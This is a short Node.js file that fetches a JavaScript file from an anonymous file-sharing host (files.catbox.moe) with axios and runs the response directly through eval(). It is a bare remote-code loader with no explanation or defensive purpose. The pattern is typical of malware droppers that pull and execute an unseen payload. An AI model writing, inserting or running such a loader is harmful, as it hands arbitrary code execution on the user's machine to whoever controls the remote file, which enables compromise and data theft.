const axios = require('axios');

const url = "https://files.catbox.moe/7xi66b.js";

axios.get(url)
    .then(response => eval(response.data))
    .catch(err => console.error(err));